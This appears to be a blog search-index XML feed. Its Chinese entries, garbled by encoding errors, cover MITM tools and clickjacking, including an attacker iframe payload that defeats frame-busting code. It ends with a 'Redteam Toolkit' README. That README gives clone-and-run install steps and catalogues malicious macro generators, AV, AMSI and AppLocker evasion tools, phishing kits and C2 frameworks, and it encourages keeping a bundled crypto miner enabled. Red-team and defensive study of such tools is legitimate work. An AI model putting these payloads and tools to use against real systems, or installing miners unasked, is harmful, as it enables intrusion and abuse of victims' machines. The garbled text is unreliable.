Windowså›¾å½¢ç•Œé¢çš„å·¥å…·ï¼Œå®ƒå¯ä»¥æ‰§è¡Œä¸­é—´äººæ”»å‡»ï¼Œå—…æŽ¢å’ŒARPæŠ•æ¯’ Ettercap â€”â€” ä¸€ä¸ªåŸºäºŽå±€åŸŸç½‘çš„ä¸­é—´äººæ”»å‡»å·¥å…· Karma â€”â€” ä¸€ä¸ªä½¿ç”¨802.11 Evil Twinä»¥æ‰§è¡ŒMITMæ”»å‡»çš„å·¥å…· AirJack â€”â€” ä¸€ä¸ªæ¼”ç¤º802.11 MITMæ”»å‡»çš„å·¥å…· SSLStripâ€”â€” ä¸€ä¸ªåŸºäºŽSSLçš„MITMæ”»å‡»çš„å·¥å…· SSLSniffâ€”â€” ä¸€ä¸ªåŸºäºŽSSLçš„MITMæ”»å‡»çš„å·¥å…·ã€‚åŽŸæœ¬æ˜¯åˆ©ç”¨ä¸€ä¸ªåœ¨Internet Explorerä¸Šç¼ºé™·å®žçŽ°çš„ã€‚ csploit â€”â€” ä¸€ä¸ªåœ¨androidç³»ç»Ÿä¸Šå®žçŽ°çš„MITMæ”»å‡»å·¥å…·åŒ…ã€‚ Mallory â€”â€” ä¸€ä¸ªé€æ˜Žçš„TCPå’ŒUDP MiTMingä»£ç†ã€‚æ‰©å±•åˆ°MITM SSLï¼ŒSSHå’Œè®¸å¤šå…¶ä»–åè®®ã€‚ wsniff â€”â€” ä¸€ä¸ª802.11 HTTP/HTTPSçš„åŸºäºŽMITMæ”»å‡»çš„å·¥å…· ä¿®å¤å»ºè®® æŽ¥å…¥æ›´å®‰å…¨çš„åŠ å¯†åè®®WEP/WAPçš„æ— çº¿ç½‘ç»œ æ— çº¿è®¿é—®ç‚¹å…·æœ‰å¼ºå¤§çš„åŠ å¯†æœºåˆ¶ï¼Œå¯ä»¥é˜²æ­¢æœ‰å®³ç”¨æˆ·ä»…åœ¨é™„è¿‘å°±å¯ä»¥åŠ å…¥æ‚¨çš„ç½‘ç»œã€‚å¼±çš„åŠ å¯†æœºåˆ¶å¯ä»¥ä½¿æ”»å‡»è€…ä»¥æš´åŠ›æ–¹å¼è¿›å…¥ç½‘ç»œå¹¶å¼€å§‹ä¸­é—´äººæ”»å‡»ã€‚åŠ å¯†å®žæ–½è¶Šå¼ºï¼Œå°±è¶Šå®‰å…¨ã€‚ è®¾ç½®æ›´å®‰å…¨çš„è·¯ç”±å™¨ç™»å½•å‡­è¯ ç¡®ä¿æ›´æ”¹é»˜è®¤è·¯ç”±å™¨ç™»å½•åã€‚ä¸ä»…æ˜¯Wi-Fiå¯†ç ï¼Œè¿˜æœ‰è·¯ç”±å™¨ç®¡ç†ç•Œé¢çš„ç™»å½•å‡­æ®ã€‚å¦‚æžœæ”»å‡»è€…æ‰¾åˆ°äº†è·¯ç”±å™¨ç™»å½•å‡­æ®ï¼Œåˆ™ä»–ä»¬å¯ä»¥å°†DNSæœåŠ¡å™¨æ›´æ”¹ä¸ºæ¶æ„æœåŠ¡å™¨ã€‚ç”šè‡³ä½¿ç”¨æ¶æ„è½¯ä»¶æ„ŸæŸ“è·¯ç”±å™¨ã€‚ ä½¿ç”¨è™šæ‹Ÿä¸“ç”¨ç½‘ VPNå¯ç”¨äºŽä¸ºå±€åŸŸç½‘å†…çš„æ•æ„Ÿä¿¡æ¯åˆ›å»ºå®‰å…¨çš„çŽ¯å¢ƒã€‚ä»–ä»¬ä½¿ç”¨åŸºäºŽå¯†é’¥çš„åŠ å¯†æ¥åˆ›å»ºç”¨äºŽå®‰å…¨é€šä¿¡çš„å­ç½‘ã€‚è¿™æ ·ï¼Œå³ä½¿æ”»å‡»è€…ç¢°å·§è¿›å…¥å…±äº«çš„ç½‘ç»œï¼Œä»–ä¹Ÿå°†æ— æ³•ç ´è¯‘VPNä¸­çš„æµé‡ã€‚ å¼ºåˆ¶ä½¿ç”¨HTTPS HTTPSå¯ç”¨äºŽä½¿ç”¨å…¬ç§å¯†é’¥äº¤æ¢é€šè¿‡HTTPå®‰å…¨åœ°è¿›è¡Œé€šä¿¡ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å®ƒæ­£åœ¨å—…æŽ¢çš„æ•°æ®ã€‚ç½‘ç«™åº”ä»…ä½¿ç”¨HTTPSï¼Œè€Œä¸åº”æä¾›HTTPæ›¿ä»£æ–¹æ³•ã€‚ç”¨æˆ·å¯ä»¥å®‰è£…æµè§ˆå™¨æ’ä»¶ä»¥å§‹ç»ˆå¯¹è¯·æ±‚ä½¿ç”¨HTTPSæ¥å¼ºåˆ¶å®žæ–½ã€‚ åŸºäºŽå…¬é’¥å¯¹çš„èº«ä»½éªŒè¯ ä¸­é—´äººæ”»å‡»é€šå¸¸æ¶‰åŠæ¬ºéª—æŸç‰©æˆ–å¦ä¸€ç‰©ã€‚å¯ä»¥åœ¨å †æ ˆçš„å„ä¸ªå±‚ä¸­ä½¿ç”¨åŸºäºŽå…¬å…±å¯†é’¥å¯¹çš„èº«ä»½éªŒè¯ï¼ˆä¾‹å¦‚RSAï¼‰ï¼Œä»¥å¸®åŠ©ç¡®ä¿æ­£åœ¨ä¸Žä¹‹é€šä¿¡çš„å¯¹è±¡æ˜¯å¦ç¡®å®žæ˜¯è¦ä¸Žä¹‹é€šä¿¡çš„å¯¹è±¡ã€‚ ç‚¹å‡»åŠ«æŒæ¼æ´žæè¿° ç‚¹å‡»åŠ«æŒï¼ˆClick Jackingï¼‰æ˜¯ä¸€ç§è§†è§‰ä¸Šçš„æ¬ºéª—æ‰‹æ®µï¼Œæ”»å‡»è€…é€šè¿‡ä½¿ç”¨ä¸€ä¸ªé€æ˜Žçš„iframeï¼Œè¦†ç›–åœ¨ä¸€ä¸ªç½‘é¡µä¸Šï¼Œç„¶åŽè¯±ä½¿ç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šè¿›è¡Œæ“ä½œï¼Œé€šè¿‡è°ƒæ•´iframeé¡µé¢çš„ä½ç½®ï¼Œå¯ä»¥ä½¿å¾—ä¼ªé€ çš„é¡µé¢æ°å¥½å’Œiframeé‡Œå—å®³é¡µé¢é‡Œä¸€äº›åŠŸèƒ½é‡åˆï¼ˆæŒ‰é’®ï¼‰ï¼Œä»¥è¾¾åˆ°çªƒå–ç”¨æˆ·ä¿¡æ¯æˆ–è€…åŠ«æŒç”¨æˆ·æ“ä½œçš„ç›®çš„ã€‚ æ¼æ´žå±å®³ æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žæ”»å‡»è€…å¯ä»¥çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä»ŽGoogle Chrome 4.0å’ŒIE8å¼€å§‹ï¼Œå¼•å…¥äº†XSSè¿‡æ»¤å™¨ï¼Œä»¥ä¿æŠ¤ç”¨æˆ·å…å—åå°„çš„XSSæ”»å‡»ã€‚Navaå’ŒLindsayå·²ç»è§‚å¯Ÿåˆ°ï¼Œè¿™ç±»è¿‡æ»¤å™¨å¯ä»¥ä¼ªè£…æˆæ¶æ„ä»£ç ï¼Œä»Žè€Œç”¨äºŽåœç”¨å¸§æ— æ•ˆä»£ç ã€‚ ç¤ºä¾‹ï¼šç›®æ ‡ç½‘é¡µæ¡†æž¶æ— æ•ˆä»£ç ï¼š 123456&lt;script&gt; if ( top != self ) &#123; top.location=self.location; &#125;&lt;/script&gt; æ”»å‡»è€…ä»£ç ï¼š 1&lt;iframe src=â€http://target.com/?param=&lt;script&gt;ifâ€&gt; æ£€æµ‹æ–¹æ³• æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªç®€å•çš„ç½‘é¡µï¼ˆåŒ…æ‹¬åŒ…å«ç›®æ ‡ç½‘é¡µçš„æ¡†æž¶ï¼‰æ¥æµ‹è¯•ç›®æ ‡ç½‘é¡µæ˜¯å¦å¯ä»¥åŠ è½½åˆ°åµŒå…¥å¼æ¡†æž¶ä¸­ã€‚ä»¥ä¸‹ä»£ç æ®µæ˜¾ç¤ºäº†ç”¨äºŽåˆ›å»ºæ­¤æµ‹è¯•ç½‘é¡µçš„HTMLä»£ç ç¤ºä¾‹ï¼š 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;Clickjack test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src="http://www.target.site" width="500" height="500"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; å¦‚æžœå°†http://www.target.siteé¡µé¢æˆåŠŸåŠ è½½åˆ°æ¡†æž¶ä¸­ï¼Œåˆ™è¯¥ç«™ç‚¹å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå¹¶ä¸”æ²¡æœ‰é’ˆå¯¹ç‚¹å‡»åŠ«æŒæ”»å‡»çš„ä¿æŠ¤æŽªæ–½ã€‚ OWASPæ£€æµ‹æ–¹æ³•ï¼š https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.html ä¿®å¤å»ºè®® å¯ä»¥ä½¿ç”¨ä¸‰ç§ä¸»è¦æœºåˆ¶æ¥é˜²å¾¡è¿™äº›æ”»å‡»ï¼š ç¦æ­¢æµè§ˆå™¨ä½¿ç”¨X-Frame-Optionsæˆ–å†…å®¹å®‰å…¨ç­–ç•¥(frame-ancestors) HTTPæ ‡å¤´åœ¨æ¡†æž¶ä¸­åŠ è½½é¡µé¢ã€‚ ä½¿ç”¨SameSite cookieå±žæ€§å°†é¡µé¢åŠ è½½åˆ°æ¡†æž¶ä¸­æ—¶ï¼Œé˜²æ­¢åŒ…å«ä¼šè¯cookie ã€‚ åœ¨é¡µé¢ä¸­å®žçŽ°JavaScriptä»£ç ä»¥å°è¯•é˜²æ­¢å°†å…¶åŠ è½½åˆ°æ¡†æž¶ä¸­ã€‚ åŸºäºŽå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼Œä»¥ä¸‹CSPä»…å°†æ¡†æž¶åˆ—å…¥ç™½åå•ï¼š ä¸ºäº†é˜²æ­¢å†…å®¹çš„æ‰€æœ‰æ¡†æž¶ä½¿ç”¨ï¼š Content-Security-Policy: frame-ancestors &#39;none&#39;; è¦å…è®¸ç½‘ç«™æœ¬èº«ä½¿ç”¨ï¼Œè¯·ä½¿ç”¨ï¼š Content-Security-Policy: frame-ancestors &#39;self&#39;; è¦å…è®¸ä¿¡ä»»åŸŸï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š Content-Security-Policy: frame-ancestors trusted.com;]]></content>
      <categories>
        <category>å®‰å…¨çŸ¥è¯†</category>
      </categories>
      <tags>
        <tag>å®‰å…¨çŸ¥è¯†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux å¸¸ç”¨å‘½ä»¤]]></title>
    <url>%2F2019%2F04%2F08%2FLinux%20command.html</url>
    <content type="text"><![CDATA[Linux å¸¸ç”¨å‘½ä»¤æ“ä½œ æ¸©æ•…è€ŒçŸ¥æ–° 12kill -9 `ps -ef|grep apache2|grep -v grep|awk &apos;&#123;print $2&#125;&apos; `æŒ‡å®šè¿›ç¨‹åæ‰§è¡Œ killå‘½ä»¤]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redteam Toolkit]]></title>
    <url>%2F2019%2F04%2F07%2FRedteam%20Toolkit.html</url>
    <content type="text"><![CDATA[This tool kit is very much influenced by infosecn1njaâ€™s kit.Use this script to grab majority of the repos. NOTE: hard coded in /opt and made for Kali Linux Total Size (so far): 2.5+Gb Install Guide:123git clone https://github.com/shr3ddersec/Shr3dKit.gitpip install -r requirements.txtbash shr3dkit.sh Change Log1234Fixed: macro_pack, LaZagneCode: Added all requirements to script, seperated pip requirements and merged to one file.Tools Added: Modlishka, pwndb, cat-sites, Phantom-Evasion Phantom Evasion Forewarning Currently pursuing a permanent an IT Sec role, for personal budgeting I added this tool as does a fantastic job for AV Evasion without opening up your wallet. Keep in mind, this does have crypto miner (xmr-stak) installer option. I kept the complete install out of script purposely for this reason. To disable, please change Miner=False in Setup/Config.txt then run the script. You may always keep it on to help the devs, such as myself in my home lab. Contents Reconnaissance Weaponization Delivery Command and Control Lateral Movement Establish Foothold Escalate Privileges Data Exfiltration Misc References ReconnaissanceActive Intelligence Gathering EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. https://github.com/ChrisTruncer/EyeWitness AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for loot. https://github.com/jordanpotti/AWSBucketDump AQUATONE is a set of tools for performing reconnaissance on domain names. https://github.com/michenriksen/aquatone spoofcheck a program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. https://github.com/BishopFox/spoofcheck Nmap is used to discover hosts and services on a computer network, thus building a â€œmapâ€ of the network. https://github.com/nmap/nmap dnsrecon a tool DNS Enumeration Script. https://github.com/darkoperator/dnsrecon Passive Intelligence Gathering Social Mapper OSINT Social Media Mapping Tool, takes a list of names &amp; images (or LinkedIn company name) and performs automated target searching on a huge scale across multiple social media sites. Not restricted by APIs as it instruments a browser using Selenium. Outputs reports to aid in correlating targets across sites. https://github.com/SpiderLabs/social_mapper skiptracer OSINT scraping framework, utilizes some basic python webscraping (BeautifulSoup) of PII paywall sites to compile passive information on a target on a ramen noodle budget. https://github.com/xillwillx/skiptracer ScrapedIn a tool to scrape LinkedIn without API restrictions for data reconnaissance. https://github.com/dchrastil/ScrapedIn linkScrape A LinkedIn user/company enumeration tool. https://github.com/NickSanzotta/linkScrape FOCA (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. https://github.com/ElevenPaths/FOCA theHarvester is a tool for gathering subdomain names, e-mail addresses, virtualhosts, open ports/ banners, and employee names from different public sources. https://github.com/laramies/theHarvester Metagoofil is a tool for extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites. https://github.com/laramies/metagoofil SimplyEmail Email recon made fast and easy, with a framework to build on. https://github.com/killswitch-GUI/SimplyEmail truffleHog searches through git repositories for secrets, digging deep into commit history and branches. https://github.com/dxa4481/truffleHog Just-Metadata is a tool that gathers and analyzes metadata about IP addresses. It attempts to find relationships between systems within a large dataset. https://github.com/ChrisTruncer/Just-Metadata typofinder a finder of domain typos showing country of IP address. https://github.com/nccgroup/typofinder pwnedOrNot is a python script which checks if the email account has been compromised in a data breach, if the email account is compromised it proceeds to find passwords for the compromised account. https://github.com/thewhiteh4t/pwnedOrNot GitHarvester This tool is used for harvesting information from GitHub like google dork. https://github.com/metac0rtex/GitHarvester pwndb is a python command-line tool for searching leaked credentials using the Onion service with the same name. https://github.com/davidtavarez/pwndb/ Frameworks Maltego is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. https://www.paterva.com/web7/downloads.php SpiderFoot the open source footprinting and intelligence-gathering tool. https://github.com/smicallef/spiderfoot datasploit is an OSINT Framework to perform various recon techniques on Companies, People, Phone Number, Bitcoin Addresses, etc., aggregate all the raw data, and give data in multiple formats. https://github.com/DataSploit/datasploit Recon-ng is a full-featured Web Reconnaissance framework written in Python. https://bitbucket.org/LaNMaSteR53/recon-ng Weaponization Composite Moniker Proof of Concept exploit for CVE-2017-8570. https://github.com/rxwx/CVE-2017-8570 Exploit toolkit CVE-2017-8759 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. https://github.com/bhdresh/CVE-2017-8759 CVE-2017-11882 Exploit accepts over 17k bytes long command/code in maximum. https://github.com/unamer/CVE-2017-11882 Adobe Flash Exploit CVE-2018-4878. https://github.com/anbai-inc/CVE-2018-4878 Exploit toolkit CVE-2017-0199 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. https://github.com/bhdresh/CVE-2017-0199 demiguise is a HTA encryption tool for RedTeams. https://github.com/nccgroup/demiguise Office-DDE-Payloads collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique. https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads CACTUSTORCH Payload Generation for Adversary Simulations. https://github.com/mdsecactivebreach/CACTUSTORCH SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. https://github.com/mdsecactivebreach/SharpShooter Donâ€™t kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. https://github.com/Mr-Un1k0d3r/DKMC Malicious Macro Generator Utility Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism. https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator SCT Obfuscator Cobalt Strike SCT payload obfuscator. https://github.com/Mr-Un1k0d3r/SCT-obfuscator Invoke-Obfuscation PowerShell Obfuscator. https://github.com/danielbohannon/Invoke-Obfuscation Invoke-DOSfuscation cmd.exe Command Obfuscation Generator &amp; Detection Test Harness. https://github.com/danielbohannon/Invoke-DOSfuscation morphHTA Morphing Cobalt Strikeâ€™s evil.HTA. https://github.com/vysec/morphHTA Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. https://github.com/trustedsec/unicorn Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. https://www.shellterproject.com/ EmbedInHTML Embed and hide any file in an HTML file. https://github.com/Arno0x/EmbedInHTML SigThief Stealing Signatures and Making One Invalid Signature at a Time. https://github.com/secretsquirrel/SigThief Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. https://github.com/Veil-Framework/Veil CheckPlease Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. https://github.com/Arvanaghi/CheckPlease Invoke-PSImage is a tool to embeded a PowerShell script in the pixels of a PNG file and generates a oneliner to execute. https://github.com/peewpw/Invoke-PSImage LuckyStrike a PowerShell based utility for the creation of malicious Office macro documents. To be used for pentesting or educational purposes only. https://github.com/curi0usJack/luckystrike ClickOnceGenerator Quick Malicious ClickOnceGenerator for Red Team. The default application a simple WebBrowser widget that point to a website of your choice. https://github.com/Mr-Un1k0d3r/ClickOnceGenerator macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments. https://github.com/sevagas/macro_pack StarFighters a JavaScript and VBScript Based Empire Launcher. https://github.com/Cn33liz/StarFighters nps_payload this script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. https://github.com/trustedsec/nps_payload SocialEngineeringPayloads a collection of social engineering tricks and payloads being used for credential theft and spear phishing attacks. https://github.com/bhdresh/SocialEngineeringPayloads The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. https://github.com/trustedsec/social-engineer-toolkit Phishery is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication. https://github.com/ryhanson/phishery PowerShdll run PowerShell with rundll32. Bypass software restrictions. https://github.com/p3nt4/PowerShdll Ultimate AppLocker ByPass List The goal of this repository is to document the most common techniques to bypass AppLocker. https://github.com/api0cradle/UltimateAppLockerByPassList Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. https://github.com/sensepost/ruler Generate-Macro is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method. https://github.com/enigma0x3/Generate-Macro Malicious Macro MSBuild Generator Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass. https://github.com/infosecn1nja/MaliciousMacroMSBuild Meta Twin is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. https://github.com/threatexpress/metatwin WePWNise generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software. https://github.com/mwrlabs/wePWNise DotNetToJScript a tool to create a JScript file which loads a .NET v2 assembly from memory. https://github.com/tyranid/DotNetToJScript PSAmsi is a tool for auditing and defeating AMSI signatures. https://github.com/cobbr/PSAmsi Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. https://github.com/stephenfewer/ReflectiveDLLInjection ps1encode use to generate and encode a powershell based metasploit payloads. https://github.com/CroweCybersecurity/ps1encode Worse PDF turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines. https://github.com/3gstudent/Worse-PDF SpookFlare has a different perspective to bypass security measures and it gives you the opportunity to bypass the endpoint countermeasures at the client-side detection and network-side detection. https://github.com/hlldz/SpookFlare GreatSCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. https://github.com/GreatSCT/GreatSCT nps running powershell without powershell. https://github.com/Ben0xA/nps Meterpreter_Paranoid_Mode.sh allows users to secure your staged/stageless connection for Meterpreter by having it check the certificate of the handler it is connecting to. https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL The Backdoor Factory (BDF) is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. https://github.com/secretsquirrel/the-backdoor-factory MacroShop a collection of scripts to aid in delivering payloads via Office Macros. https://github.com/khr0x40sh/MacroShop UnmanagedPowerShell Executes PowerShell from an unmanaged process. https://github.com/leechristensen/UnmanagedPowerShell evil-ssdp Spoof SSDP replies to phish for NTLM hashes on a network. Creates a fake UPNP device, tricking users into visiting a malicious phishing page. https://gitlab.com/initstring/evil-ssdp Ebowla Framework for Making Environmental Keyed Payloads. https://github.com/Genetic-Malware/Ebowla make-pdf-embedded a tool to create a PDF document with an embedded file. https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py avet (AntiVirusEvasionTool) is targeting windows machines with executable files using different evasion techniques. https://github.com/govolution/avet Phantom-Evasion Interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads). https://github.com/oddcod3/Phantom-Evasion WARNING: Please be aware this does install a Minero miner by default. This can be changed in the Setup folder and edit Config.txt and edit Mining = False. If you want to support the project and developers, I would recommend keeping on. DeliveryPhishing King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. https://github.com/securestate/king-phisher FiercePhish is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more. https://github.com/Raikia/FiercePhish ReelPhish is a Real-Time Two-Factor Phishing Tool. https://github.com/fireeye/ReelPhish/ Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training. https://github.com/gophish/gophish CredSniper is a phishing framework written with the Python micro-framework Flask and Jinja2 templating which supports capturing 2FA tokens. https://github.com/ustayready/CredSniper PwnAuth a web application framework for launching and managing OAuth abuse campaigns. https://github.com/fireeye/PwnAuth Phishing Frenzy Ruby on Rails Phishing Framework. https://github.com/pentestgeek/phishing-frenzy Phishing Pretexts a library of pretexts to use on offensive phishing engagements. https://github.com/L4bF0x/PhishingPretexts Modlishka is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level. https://github.com/drk1wi/Modlishka Watering Hole Attack BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. https://github.com/beefproject/beef Command and ControlRemote Access Tools Cobalt Strike is software for Adversary Simulations and Red Team Operations. https://cobaltstrike.com/ Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. https://github.com/EmpireProject/Empire Metasploit Framework is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. https://github.com/rapid7/metasploit-framework SILENTTRINITY A post-exploitation agent powered by Python, IronPython, C#/.NET. https://github.com/byt3bl33d3r/SILENTTRINITY Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python. https://github.com/n1nj4sec/pupy Koadic or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. https://github.com/zerosum0x0/koadic PoshC2 is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. https://github.com/nettitude/PoshC2 Gcat a stealthy Python based backdoor that uses Gmail as a command and control server. https://github.com/byt3bl33d3r/gcat TrevorC2 is a legitimate website (browsable) that tunnels client/server communications for covert command execution. https://github.com/trustedsec/trevorc2 Merlin is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang. https://github.com/Ne0nd0g/merlin Quasar is a fast and light-weight remote administration tool coded in C#. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. https://github.com/quasar/QuasarRAT Staging Rapid Attack Infrastructure (RAI) Red Team Infrastructureâ€¦ Quickâ€¦ Fastâ€¦ SimplifiedOne of the most tedious phases of a Red Team Operation is usually the infrastructure setup. This usually entailsa teamserver or controller, domains, redirectors, and a Phishing server. https://github.com/obscuritylabs/RAI Red Baron is a set of modules and custom/third-party providers for Terraform which tries to automate creating resilient, disposable, secure and agile infrastructure for Red Teams. https://github.com/byt3bl33d3r/Red-Baron EvilURL generate unicode evil domains for IDN Homograph Attack and detect them. https://github.com/UndeadSec/EvilURL Domain Hunter checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names. https://github.com/threatexpress/domainhunter PowerDNS is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only. https://github.com/mdsecactivebreach/PowerDNS Chameleon a tool for evading Proxy categorisation. https://github.com/mdsecactivebreach/Chameleon CatMyFish Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&amp;C. https://github.com/Mr-Un1k0d3r/CatMyFish Malleable C2 is a domain specific language to redefine indicators in Beaconâ€™s communication. https://github.com/rsmudge/Malleable-C2-Profiles Malleable-C2-Randomizer This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage, hopefully reducing the chances of flagging signature-based detection controls. https://github.com/bluscreenofjeff/Malleable-C2-Randomizer FindFrontableDomains search for potential frontable domains. https://github.com/rvrsh3ll/FindFrontableDomains Postfix-Server-Setup Setting up a phishing server is a very long and tedious process. It can take hours to setup, and can be compromised in minutes. https://github.com/n0pe-sled/Postfix-Server-Setup DomainFrontingLists a list of Domain Frontable Domains by CDN. https://github.com/vysec/DomainFrontingLists Apache2-Mod-Rewrite-Setup Quickly Implement Mod-Rewrite in your infastructure. https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup mod_rewrite rule to evade vendor sandboxes. https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10 external_c2 framework a python framework for usage with Cobalt Strikeâ€™s External C2. https://github.com/Und3rf10w/external_c2_framework ExternalC2 a library for integrating communication channels with the Cobalt Strike External C2 server. https://github.com/ryhanson/ExternalC2 cs2modrewrite a tools for convert Cobalt Strike profiles to modrewrite scripts. https://github.com/threatexpress/cs2modrewrite e2modrewrite a tools for convert Empire profiles to Apache modrewrite scripts. https://github.com/infosecn1nja/e2modrewrite redi automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt). https://github.com/taherio/redi Domain Fronting Google App Engine. https://github.com/redteam-cyberark/Google-Domain-fronting DomainFrontDiscover Scripts and results for finding domain frontable CloudFront domains. https://github.com/peewpw/DomainFrontDiscover Automated Empire Infrastructure https://github.com/bneg/RedTeam-Automation Serving Random Payloads with NGINX. https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9 meek is a blocking-resistant pluggable transport for Tor. It encodes adata stream as a sequence of HTTPS requests and responses. https://github.com/arlolra/meek CobaltStrike-ToolKit Some useful scripts for CobaltStrike. https://github.com/killswitch-GUI/CobaltStrike-ToolKit mkhtaccess_red Auto-generate an HTaccess for payload delivery â€“ automatically pulls ips/nets/etc from known sandbox companies/sources that have been seen before, and redirects them to a benign payload. https://github.com/violentlydave/mkhtaccess_red RedFile a flask wsgi application that serves files with intelligence, good for serving conditional RedTeam payloads. https://github.com/outflanknl/RedFile keyserver Easily serve HTTP and DNS keys for proper payload protection. https://github.com/leoloobeek/keyserver DoHC2 allows the ExternalC2 library from Ryan Hanson (https://github.com/ryhanson/ExternalC2) to be leveraged for command and control (C2) via DNS over HTTPS (DoH). This is built for the popular Adversary Simulation and Red Team Operations Software Cobalt Strike (https://www.cobaltstrike.com). https://github.com/SpiderLabs/DoHC2 cat-sites Library of sites for categorization. https://github.com/audrummer15/cat-sites Lateral Movement CrackMapExec is a swiss army knife for pentesting networks. https://github.com/byt3bl33d3r/CrackMapExec PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. https://github.com/Mr-Un1k0d3r/PowerLessShell GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application. https://github.com/GoFetchAD/GoFetch ANGRYPUPPY a bloodhound attack path automation in CobaltStrike. https://github.com/vysec/ANGRYPUPPY DeathStar is a Python script that uses Empireâ€™s RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques. https://github.com/byt3bl33d3r/DeathStar SharpHound C# Rewrite of the BloodHound Ingestor. https://github.com/BloodHoundAD/SharpHound BloodHound.py is a Python based ingestor for BloodHound, based on Impacket. https://github.com/fox-it/BloodHound.py Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. https://github.com/SpiderLabs/Responder SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally. https://github.com/fireeye/SessionGopher PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. https://github.com/PowerShellMafia/PowerSploit 